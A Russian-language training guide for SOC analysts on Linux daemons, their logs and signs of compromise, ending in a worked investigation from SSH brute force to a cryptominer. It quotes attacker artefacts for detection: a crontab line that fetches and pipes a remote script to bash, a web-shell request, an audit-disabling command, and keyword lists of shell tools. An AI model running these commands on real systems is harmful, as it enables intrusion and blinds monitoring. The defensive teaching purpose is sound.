# Типовые демоны Linux и признаки аномалий для SOC-аналитика

## 1. Демоны в экосистеме Linux: контекст, классификация и типовые роли

**Демон** (daemon) — фоновый процесс, запускаемый на этапе загрузки системы или по требованию, выполняющий служебные функции без непосредственного взаимодействия с пользовательским терминалом. В Linux подсистема инициализации `systemd` управляет демонами как *юнитами* (`.service`), обеспечивая их запуск, мониторинг и корректную остановку. Демоны обычно порождаются процессом `init` (PID 1) и не имеют управляющего терминала — именно это отличает их от пользовательских фоновых процессов, запущенных в терминальном сеансе с помощью `&`. Для аналитика SOC принципиально разграничивать легитимные системные демоны и потенциально вредоносные процессы, маскирующиеся под них.

Классификация демонов строится по функциональному признаку и отражает области, наиболее часто затрагиваемые атаками:

| Категория | Примеры демонов | Основная функция | Наиболее критичные события для мониторинга |
|-----------|----------------|-------------------|---------------------------------------------|
| Сетевые службы удалённого доступа | `sshd` | Обработка входящих SSH-подключений | Многократные неудачи аутентификации, вход под учётной записью `root`, смена пароля через сессию |
| Планировщики задач | `crond`, `atd` | Выполнение отложенных заданий | Добавление заданий от необычных пользователей, модификация скриптов в `/etc/cron.*`, запуск бинарников из `/tmp` |
| Системное логирование | `rsyslogd`, `syslog-ng`, `journald` | Сбор, фильтрация и запись логов | Остановка службы, неожиданная замена конфигурации, отправка логов на внешние хосты |
| Аудит и мониторинг | `auditd`, `osqueryd` | Захват системных вызовов и изменений состояния | Отключение аудита, аномальная запись событий с ключевыми словами, модификация правил аудита |
| Веб-серверы и прокси | `httpd` (Apache), `nginx`, `haproxy` | Обслуживание HTTP/HTTPS-запросов | Необычные URI, POST-запросы к несуществующим скриптам, ошибки 404 на web-shell пути |
| Аутентификация и каталоги | `sssd`, `winbindd` | Интеграция с LDAP/AD, кэширование учётных данных | Аномальное количество обращений к кэшу, запросы от непривилегированных процессов |
| СУБД | `mysqld`, `postgresql`, `mongod` | Обработка запросов к базам данных | Подозрительные SQL-запросы, создание новых пользователей БД, изменение таблиц привилегий |
| Почтовые агенты | `postfix/master`, `dovecot` | Передача и доставка электронной почты | Массовая рассылка, подключения с нехарактерных IP, попытки аутентификации с неверными учётными данными |

Приведённая таблица не исчерпывает всех демонов, но выделяет те, логи которых согласно чеклисту первой реакции SOC-аналитика помогают ответить на ключевые вопросы инцидента: аутентификация (`/var/log/auth.log`, `/var/log/secure`), системные события (`/var/log/syslog`, `/var/log/messages`), сетевые подключения и аномалии ядра [SOCLab WUST](https://soclab.wust.edu/must-know-logs-for-soc-analysts-first-response-checklist-for-triage-threat-hunting-incident-investigation). Именно логи этих демонов формируют костяк расследования.

Конфигурация демонов, как правило, располагается в `/etc/` (например, `/etc/ssh/sshd_config`, `/etc/crontab`, `/etc/audit/auditd.conf`). Изменение этих файлов без соответствующего change management — сильный сигнал аномалии. С точки зрения SOC L1, важно уметь сопоставлять сообщения демонов в журналах с событиями в системе: так, запись `sshd[1234]: Failed password for root from 10.14.94.82 port 22 ssh2` означает, что демон SSH зафиксировал неудачную попытку, а уже агрегация подобных записей позволяет выявить брутфорс-атаку [LinkedIn](https://www.linkedin.com/posts/akshay-tiwari-itsec_soc-cybersecurity-threathunting-activity-7335523158243917826-wOcd).

Важно не путать понятие «демон» с понятием «служба Windows»: хотя обе сущности выполняют фоновые задачи, механизмы их запуска, изоляции и логирования кардинально различаются. В Linux демон — обычный процесс, порождённый от PID 1 и отделённый от терминала, тогда как Windows-служба — специальный процесс, запускаемый Service Control Manager с отдельной сессией и управляемый через Win32 API. Для аналитика SOC, работающего в гетерогенной среде, это разграничение существенно: логи демона `sshd` вы найдёте в текстовых файлах `/var/log/auth.log`, а логи RDP — в каналах событий Windows с идентификаторами 4624/4625.

Таким образом, типовые демоны Linux — это, прежде всего, процессы с предсказуемым поведением и устоявшимися местами расположения логов. Любое отклонение от этого предсказуемого поведения — предмет дальнейшего анализа на предмет аномалий.

## 2. Признаки аномального поведения демонов и индикаторы компрометации

Аномалия демона — это событие или последовательность событий, выходящие за пределы нормального функционирования. Для SOC-аналитика первого уровня аномалии классифицируются по источнику обнаружения и стадии атаки. Рассмотрим основные категории признаков, сгруппированные по демонам и дополненные способами выявления.

### 2.1. Демон SSH (sshd)

SSH — наиболее частый вектор начального доступа к Linux-системе. Подозрительные паттерны:

- **Брутфорс-атака:** повторяющиеся записи `Failed password for invalid user ...` или `Failed password for root`. В логах аутентификации это выглядит как высокая частота событий с одного IP-адреса. Критично для SOC L1 — немедленно проверить, завершилась ли атака успешной аутентификацией (`Accepted password for ...` после серии провалов).
- **Нестандартное поднятие оболочки:** в параметрах процесса `sshd` могут появляться подозрительные аргументы, например `-R` (удалённое перенаправление портов) для туннелирования, или запуск дочернего процесса `bash` с ключами `-i` (интерактивный режим), что может указывать на reverse shell. Эти события фиксируются в логах аудита (`type=EXECVE`) или в логах `auditd`, если настроен мониторинг системных вызовов.
- **Вход под учётной записью root** с необычного IP-адреса. Хотя прямая root-аутентификация часто отключена в `sshd_config` (параметр `PermitRootLogin no`), её включение или попытки входа под root должны немедленно проверяться.
- **Создание SSH-ключей:** в логах аудита или изменений файловой системы (например, `inotify`) фиксируется запись в `~/.ssh/authorized_keys`. Это классический метод закрепления (persistence). Определить можно по событиям `open` с флагами `O_WRONLY|O_CREAT` на этот файл.

Инструментарий: `cat /var/log/auth.log | grep "sshd"`, `journalctl -u sshd`, `ausearch -p $(pgrep sshd)`.

### 2.2. Планировщик задач (crond)

Планировщик cron используется злоумышленниками для периодического запуска вредоносного ПО или поддержания доступа. Признаки аномалий:

- **Появление новых записей в пользовательских crontab**, особенно для учётных записей, обычно не использующих cron (например, `www-data`). Проверяется командой `crontab -l -u <username>` или мониторингом директории `/var/spool/cron/crontabs/`.
- **Модификация системных cron-директорий**: `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.hourly/` и т.п. Добавление туда скриптов, часто маскирующихся под системные (имена со случайными строками, двойными расширениями `.sh.gz`).
- **Выполнение заданий из нестандартных локаций**, таких как `/tmp`, `/dev/shm`, `/var/tmp`. Например, строка в crontab: `* * * * * /tmp/.cache/update.sh`. В логах `syslog` можно встретить выполнение подозрительного задания: `CRON[pid]: (user) CMD (/tmp/.cache/update.sh)`.
- **Использование cron в цепочке загрузки:** задание может загружать скрипт по URL с помощью `curl` или `wget`, после чего исполнять его. Такие команды в `crontab` должны настораживать.

Кросс-корреляция с логами аудита позволяет увидеть полную картину: кто изменил crontab, откуда было инициировано изменение.

### 2.3. Веб-сервер (httpd/nginx)

Веб-демоны — частые цели эксплуатации через уязвимости веб-приложений. Аномалии в их поведении:

- **Web-shell активность:** запросы к несуществующим скриптам в периодическом режиме (по логам доступа), например, `POST /upload.php` или `GET /cmd.php?cmd=id`. Сами скрипты могут быть загружены через уязвимость, и их выполнение порождает дочерние процессы демона `httpd` с параметрами командной оболочки. В логах аудита видно, как веб-сервер вызывает `sh -c <команда>`.
- **Нетипичные User-Agent:** известные инструменты (sqlmap, nikto, gobuster) могут генерировать запросы, но аналитик должен обращать внимание и на запросы без User-Agent или с подозрительными значениями (например, содержащими `curl`).
- **Исходящие соединения, инициированные веб-демоном.** В норме веб-сервер не должен инициировать новые TCP-соединения наружу (кроме как к базам данных или кэшам). Появление таких подключений на нестандартные порты — признак reverse shell или data exfiltration. Детектируется через `netstat -pan | grep httpd` или с помощью `osquery`: `SELECT * FROM process_open_sockets WHERE pid IN (SELECT pid FROM processes WHERE name='nginx');`.

### 2.4. Демон аудита (auditd) и его заменители

Хотя сам `auditd` является средством обнаружения, его компрометация (отключение аудита, изменение правил) — событие высшей критичности. SOC-аналитик должен мониторить:

- **Событие `DAEMON_END` для процесса auditd** — означает остановку демона аудита. В сочетании с отсутствием других административных действий подозрительно.
- **Изменение файла правил `/etc/audit/rules.d/audit.rules`** без санкции.
- **Использование утилиты `auditctl`** для оперативного изменения правил: `auditctl -e 0` (отключение аудита).
- **Наличие логов с ключевыми словами**, указывающими на подозрительную активность: появление `execve` с аргументами, характерными для утилит эксплуатации (`nc`, `socat`, `python -c 'import pty'`).

Инструменты вроде `GoAudit` от Slack (замена `auditd`, публикующая JSON-блобы) упрощают анализ, преобразуя многострочные записи аудита в структурированный формат, удобный для SIEM [Panther](https://panther.com/blog/open-source-cloud-security-tools). Для SOC L1 это означает меньше времени на разбор сырых логов и быстрее выявление аномалий.

### 2.5. Демоны аутентификации и интеграции (sssd, winbindd)

Эти демоны обслуживают запросы аутентификации от системы. Аномалии:

- **Необычно высокая загрузка демона** без соответствующих пиков легитимной активности может указывать на брутфорс или DDoS внутренних сервисов аутентификации.
- **Попытки доступа к кэшу учётных данных (`/var/lib/sss/db/`)** со стороны процессов, не имеющих к этому отношения. Мониторинг системных вызовов `open`, `read` к этим файлам может выявить попытку кражи учётных записей.
- **Сообщения о неверных паролях для сервисных учётных записей**, которые не должны аутентифицироваться вручную.

### 2.6. Прочие демоны и общие индикаторы

- **Демоны, запущенные из подозрительных каталогов** (`/tmp`, `/dev/shm`, `/var/tmp`). Например, `/tmp/xmrig` — скрытый майнер.
- **Нестандартные пути к исполняемым файлам** в выводе `ps` или `/proc/<pid>/exe`, симлинки, ведущие в неожиданные места.
- **Подмена конфигураций демонов**, особенно связанных с безопасностью: `sshd_config`, `auditd.conf`, `rsyslog.conf`. Изменения можно отследить через аудит файловой системы.
- **Порождение оболочки демоном:** например, демон `cupsd` (печать) вдруг запускает `/bin/bash`. Такие аномалии детектируются с помощью анализа цепочек процессов (parent-child), получаемых из `auditd`.

Важно понимать, что не каждое аномальное событие по отдельности — свидетельство компрометации, но комбинация нескольких признаков (например, необычное cron-задание + исходящее соединение от `httpd` + появление нового пользователя) резко повышает надёжность детекта. SOC L1 должен уметь связывать такие артефакты, используя временные метки и идентификаторы процессов.

## 3. Работа аналитика SOC с данными демонов: сбор, анализ, инструменты

Для SOC-аналитика первого уровня демоны — не только объект мониторинга, но и источник структурированных логов, которые необходимо быстро интерпретировать. Основной задачей является выявление аномалий на стадии триажа и эскалация инцидентов, требующих углублённого исследования. Процесс работы можно разбить на несколько этапов.

### 3.1. Источники логов демонов

Централизованный сбор логов демонов в Linux-инфраструктуре обычно базируется на одном из трёх механизмов:

- **Традиционный syslog** (`rsyslogd`, `syslog-ng`): демоны отправляют сообщения через библиотеку `syslog()` в сокет `/dev/log`. Администратор конфигурирует запись в файлы (`/var/log/auth.log`, `/var/log/syslog`, `/var/log/cron`) и, при необходимости, пересылку на центральный SIEM-коллектор. SOC L1 работает с этими файлами напрямую на хосте (через SSH или удалённый терминал) либо через интерфейс SIEM-системы (Splunk, Elasticsearch, QRadar).
- **Journald (systemd-journald)**: сохраняет логи в бинарном формате. Доступны через `journalctl`. Позволяет фильтровать по юниту (`-u sshd`), времени, степени важности. Для SIEM обычно настраивается пересылка в syslog (опция `ForwardToSyslog=yes` в `/etc/systemd/journald.conf`) или использование агента для прямой отправки.
- **Auditd (Linux Audit Framework)**: обеспечивает детальные записи системных вызовов, через которые видны действия, инициированные демонами (запуск дочерних процессов, изменение файлов). Как упомянуто в выдержках [YouTube TryHackMe](https://www.youtube.com/watch?v=k_jFLEVJ7UE), без `auditd` невозможно получить ответ на вопрос «какие программы запускал пользователь bob?» — поэтому SOC-команды внедряют его как обязательный компонент мониторинга.

На практике многие организации дополнительно развёртывают `osqueryd` — демон, позволяющий опрашивать состояние системы через SQL-запросы. Osquery регистрирует изменения (например, появление новых прослушивающих портов) и генерирует логи, которые затем анализируются в SIEM или хранилище [Panther](https://panther.com/blog/open-source-cloud-security-tools).

### 3.2. Типовые операции триажа на основе логов демонов

Когда срабатывает алерт из SIEM или аналитик проводит проактивный поиск (threat hunting), он обращается к стандартным командам и шаблонам запросов. Ниже приведены часто используемые процедуры, адаптированные под уровень L1.

**Поиск SSH-брутфорса**:  
В файле `/var/log/auth.log` или через SIEM-запрос (index=auth) ищутся множественные неудачные попытки. Типичная конвейерная команда на Linux-хосте:
```bash
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
```
Вывод покажет топ атакующих IP и количество попыток. Если какой-то счётчик резко выделяется, аналитик проверяет, были ли успешные аутентификации с этого же IP (поиск `Accepted`). Данная процедура описана в разборе комнаты TryHackMe [Medium](https://medium.com/@furkanctiner/decoding-linux-logs-a-soc-analysts-guide-to-the-tryhackme-room-6cf3432f0047), где после `grep "sshd"` и `grep -i "Failed"` отчётливо виден IP `10.14.94.82`.

**Выявление неавторизованного создания пользователя**:
Запись о создании учётной записи `useradd` обычно попадает в `auth.log`. Чтобы найти подозрительные действия:
```bash
grep "useradd" /var/log/auth.log
```
Дополнительно можно искать добавление в группу `sudo` через `grep "usermod" /var/log/auth.log | grep "sudo"`. Это помогает выявить атаку, где злоумышленник создал пользователя `xerxes` и назначил ему административные привилегии [Medium](https://medium.com/@furkanctiner/decoding-linux-logs-a-soc-analysts-guide-to-the-tryhackme-room-6cf3432f0047).

**Мониторинг подозрительных cron-заданий**:
Просмотр системных логов (`syslog`):
```bash
grep CRON /var/log/syslog
```
Аналитик ищет команды, выполняемые нестандартными пользователями или с необычными путями. Например, `(www-data) CMD (/tmp/.xsession-errors)` — явно аномалия. В более автоматизированном подходе можно применить `osquery`:
```sql
SELECT command, path FROM crontab;
```
Osqueryd периодически фиксирует изменения и отправляет в SIEM.

**Анализ сетевой активности демонов**:
Для быстрого обнаружения reverse shell, инициированного веб-сервером или другим демоном, используется:
```bash
ss -tunap | grep -E '("httpd"|"nginx"|"apache2")' | grep ESTAB
```
Показывает все установленные соединения, где процессом является один из веб-демонов. Если в выводе фигурирует исходящее соединение на внешний IP и нестандартный порт (не 80/443), — это кандидат на инцидент.

### 3.3. Интеграция в SIEM и правила детектирования

Для масштабирования работы SOC L1 на множество хостов все описанные процедуры формализуются в правилах корреляции SIEM. Современные аналитики используют язык Sigma для описания детектов, которые не привязаны к конкретной SIEM-платформе. Ниже приведена иллюстративная схема правила (синтаксис Sigma) для обнаружения подозрительного cron-задания, маскирующегося под легитимное.

```yaml
title: Suspicious Cron Job from Web User
description: Detects when the www-data user executes unusual commands via cron
logsource:
  product: linux
  service: syslog
  definition: 'cron logs with CMD field'
detection:
  selection:
    user|all:
      - 'www-data'
      - 'apache'
      - 'nobody'
    command|contains:
      - '/tmp/'
      - '/dev/shm/'
      - '/var/tmp/'
  condition: selection
level: high
```

Данное правило (значения команд иллюстративные, зависят от окружения) при развёртывании в SIEM будет генерировать алерт при появлении подозрительной записи в логах cron. Аналитик первого уровня, увидев такой алерт, должен проверить контекст: какой пользователь инициировал добавление задания (через аудит), есть ли сопутствующие сетевые события, и если подтверждается вредоносность — эскалировать для сдерживания.

### 3.4. Обратная сторона: слепые зоны и шум

Работа с логами демонов сопряжена с двумя основными сложностями:

- **Шумовые события:** легитимные фоновые действия могут выглядеть подозрительно. Например, легитимный скрипт резервного копирования, запущенный через cron от `root`, может содержать вызов `scp` на удалённый хост, что совпадает с сигнатурой эксфильтрации. Поэтому SOC L1 должен сверяться с базой нормальной активности (baseline) и временным контекстом.
- **Слепые зоны:** как отмечено в видео по Linux Threat Detection [YouTube](https://www.youtube.com/watch?v=k_jFLEVJ7UE), злоумышленник, закрепившийся на уровне веб-приложения (например, web-shell), может вовсе не генерировать события уровня `auditd` или `syslog`, поскольку вся вредоносная активность происходит в контексте самого приложения (PHP-интерпретатор выполняет команды без порождения новых процессов). В таких случаях требуются дополнительные источники, такие как логи самого приложения, WAF или декодирование сетевого трафика.

Таким образом, инструментарий аналитика не ограничивается «grep’ом по логам», а включает знание слабых мест каждого демона и использование взаимодополняющих методов мониторинга.

## 4. Сквозной практический пример: от брутфорса SSH до обнаружения майнера и persistence

Рассмотрим сценарий, иллюстрирующий полный цикл расследования на основании логов демонов. Инфраструктура: Linux-сервер Ubuntu 22.04, SSH-доступ открыт для администраторов. В SIEM поступает аномальное число событий аутентификации из источника `10.99.99.123`. Аналитик L1 приступает к триажу.

### Исходные условия
- Логи локально доступны на сервере или индексированы в SIEM (здесь для наглядности — локальные файлы).
- У аналитика есть доступ по SSH с правами обычного пользователя, sudo для чтения логов.
- Настроен стандартный `rsyslog`, auditd не активен (для части шагов используется `syslog`).

### Шаг 1: Идентификация источника брутфорса

Аналитик проверяет `auth.log` на предмет неудачных попыток.

```bash
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -5
```

_Ожидаемый вывод (иллюстративный):_

```
    48 10.99.99.123
     2 192.168.5.10
     1 172.16.0.1
```

Видим, что IP `10.99.99.123` совершил 48 неудачных попыток за короткий промежуток. Аналитик уточняет временной диапазон:

```bash
grep "10.99.99.123" /var/log/auth.log | grep "Failed" | head -3
```

_Фрагмент вывода:_

```
Nov  2 14:23:11 server sshd[11234]: Failed password for invalid user admin from 10.99.99.123 port 52987 ssh2
Nov  2 14:23:13 server sshd[11234]: Failed password for invalid user support from 10.99.99.123 port 52987 ssh2
Nov  2 14:23:15 server sshd[11234]: Failed password for root from 10.99.99.123 port 52987 ssh2
```

Обнаружены попытки подбора учётных записей. Ключевое — проверить, была ли успешная аутентификация сразу после этих попыток.

### Шаг 2: Определение успешного входа и действий злоумышленника

Поиск успешных сессий с того же IP:

```bash
grep "10.99.99.123" /var/log/auth.log | grep "Accepted"
```

_Вывод:_

```
Nov  2 14:23:17 server sshd[11234]: Accepted password for root from 10.99.99.123 port 52987 ssh2
```

Привилегированный доступ получен. Теперь аналитик ищет первые команды. Так как auditd выключен, он обращается к `syslog` и `auth.log` за последующими событиями. В `syslog` обнаруживаются записи создания пользователя:

```bash
grep "useradd" /var/log/auth.log
```

```
Nov  2 14:25:02 server useradd[13245]: new user: name=xerxes, UID=1002, GID=1002, home=/home/xerxes, shell=/bin/bash
```

И модификация группы:

```bash
grep "usermod" /var/log/auth.log | grep "sudo"
```

```
Nov  2 14:25:12 server usermod[13250]: add 'xerxes' to group 'sudo'
```

Злоумышленник создал учётную запись `xerxes` и дал ей sudo-права — классический шаг для закрепления.

### Шаг 3: Поиск механизмов persistence

Аналитик подозревает, что атакующий настроил автоматический запуск вредоносного ПО. Проверяет системные cron-логи:

```bash
grep "CRON" /var/log/syslog | grep -i "(xerxes)"
```

_Вывод: пусто. Тогда проверка crontab для всех пользователей:_

```bash
grep "xerxes" /var/spool/cron/crontabs/*
```

Находит файл с записью:

```
*/5 * * * * curl -s http://10.99.99.123/miner.sh | bash
```

Это явный признак запуска майнера или бэкдора каждые 5 минут. Аналитик также проверяет `~/.ssh/authorized_keys` созданного пользователя:

```bash
ls -la /home/xerxes/.ssh/authorized_keys
```

Файл существует, время создания совпадает с моментом атаки. Значит, у злоумышленника есть бесключевой доступ.

### Шаг 4: Анализ процесса и сетевой активности (наличие osqueryd)

В среде с установленным `osqueryd` аналитик может выполнить SQL-запросы для поиска подозрительных процессов.

```sql
SELECT pid, name, cmdline, parent FROM processes WHERE parent IN (SELECT pid FROM processes WHERE name='sshd') AND name != 'sshd';
```

Предположим, что в данный момент cron ещё не запустил скрипт. Но можно обнаружить ранее порождённый процесс `bash` с параметрами, характерными для обратного соединения, если злоумышленник использовал SSH-сессию. Также проверка открытых сетевых соединений:

```sql
SELECT p.pid, p.name, s.local_address, s.remote_address, s.state FROM process_open_sockets s JOIN processes p USING (pid) WHERE s.remote_port != '0' AND p.name IN ('bash','curl','wget');
```

В выводе видно соединение от `curl` к `10.99.99.123:http` — загрузка майнера. Теперь аналитик может построить полную картину: брутфорс SSH → вход root → создание пользователя xerxes → добавление в sudo → установка cron-задания на скачивание майнера → добавление SSH-ключа.

### Ожидаемый вывод примера

Сквозной пример демонстрирует, как SOC-аналитик первого уровня, владея знаниями о типовых демонах (sshd, crond) и признаках аномалий (множественные неудачные аутентификации, создание пользователя, подозрительная cron-запись), способен самостоятельно провести начальный триаж инцидента и собрать доказательную базу для эскалации. Использование стандартного инструментария (`grep`, `awk`, `osquery`) подтверждает, что даже при отсутствии дорогих SIEM-решений корреляция событий демонов позволяет выявить атаку на ранней стадии.
